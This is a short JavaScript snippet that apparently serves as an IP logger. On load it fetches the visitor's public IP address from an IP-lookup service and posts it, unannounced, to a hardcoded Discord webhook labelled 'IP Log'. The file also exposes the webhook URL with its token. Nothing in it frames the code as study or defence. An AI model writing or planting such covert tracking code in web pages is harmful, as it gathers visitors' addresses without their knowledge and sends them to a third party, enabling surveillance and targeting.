var webHookUrl = "https://discord.com/api/webhooks/1060286133726085151/9AD3vowr2JRrZ9J-io83BTZY_aFQqu_zPLurNqIrCMuI1dp0dScD2onSpAS5HRAZ5pwF";
const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://ip.aruljohn.com/');
    const data = await response.text();

   
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content: data
    }

    postRequest.send(JSON.stringify(params));

}

request();